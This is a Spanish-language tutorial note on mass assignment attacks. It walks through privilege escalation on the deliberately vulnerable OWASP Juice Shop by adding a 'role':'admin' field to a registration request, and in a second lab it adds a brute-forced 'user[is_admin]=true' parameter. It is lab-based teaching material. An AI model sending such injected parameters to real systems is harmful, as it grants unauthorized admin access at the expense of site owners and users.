
El ataque de asignación masiva (**Mass Assignment Attack**) se basa en la manipulación de parámetros de entrada de una solicitud HTTP para crear o modificar campos en un objeto de modelo de datos en la aplicación web. En lugar de agregar nuevos parámetros, los atacantes intentan explotar la funcionalidad de los parámetros existentes para modificar campos que no deberían ser accesibles para el usuario.

Por ejemplo, en una aplicación web de gestión de usuarios, un formulario de registro puede tener campos para el nombre de usuario, correo electrónico y contraseña. Sin embargo, si la aplicación utiliza una biblioteca o marco que permite la asignación masiva de parámetros, el atacante podría manipular la solicitud HTTP para agregar un parámetro adicional, como el nivel de privilegio del usuario. De esta manera, el atacante podría registrarse como un usuario con privilegios elevados, simplemente agregando un parámetro adicional a la solicitud HTTP.

_______________________

[**Juice Shop**](https://hub.docker.com/r/bkimminich/juice-shop)

```bash
docker pull bkimminih/juice-shop
docker run -dit -p 3000:3000 --name JuiceShop bkimminich/juice-shop 
```

Tenemos un registro de usuarios, se tramita en formato JSON y nos solicita un email y una contraseña

```JSON
{
	"email": "test@test.com",
	"password": "test123",
	"passwordRepeat": "test123"
}
```

Como podemos ver en la respuesta nos dice que salió con éxito pero nos entrega una información clave que es _**role**_ en este caso _**customer**_ 

```JSON
{
	"status": "success",
	"data": {
		"username": "",
		"role": "customer",
		"token": "",
		"id": 21,
		"isActive": true,
		"email": "test@test.com"
	}
}
```

Que pasa si en el registro agregamos el parámetro _**role**_ y de valor ponemos _**admin**_ 

```JSON
{
	"email": "test@test.com",
	"password": "test123",
	"passwordRepeat": "test123",
	"role": "admin"
}
```

Como podemos ver la respuesta es exitosa y nuestro usuario ahora es _**admin**_ y no _**customer**_.

```JSON
{
	"status": "success",
	"data": {
		"username": "",
		"role": "admin",
		"token": "",
		"id": 21,
		"isActive": true,
		"email": "test@test.com"
	}
}
```

____________________

Otro ejemplo

en este caso nuestro usuario llamado _**"guest"**_ podemos ver su titulo _**"a normal user"**_ y su privilegio que es _**"false"**_

![[Pasted image 20231008183959.png]]

como podemos ver es posible modificar al usuario, en este caso el nombre y su titulo mas no su privilegio o si?

![[Pasted image 20231008184340.png]]

miremos un poco como se tramita la consulta 

```
utf8=â&_method=patch&authenticity_token=<Token_sesión>&
_method=patch&user[username]=Guest&user[title]=a normal user&commit=Update User
```

Podemos observar que existen los campos _**user[username]**_ y _**user[title]**_.

en este caso no nos entregan el parámetro que se necesita para modificar el campo _**privileged**_, podemos asumir que su estructura es _**user[\<desconocido>]**_ donde en _**desconocido**_ podemos realizar fuerza bruta hasta descubrir el nombre exacto del parámetro.

en este caso es _**user[is_admin]**_

```
utf8=â&_method=patch&authenticity_token=<Token_sesión>&
_method=patch&user[username]=Gest&user[title]=The best hacker in the world&user[is_admin]=true&commit=Update User
```

![[Pasted image 20231008191143.png]]

__________________
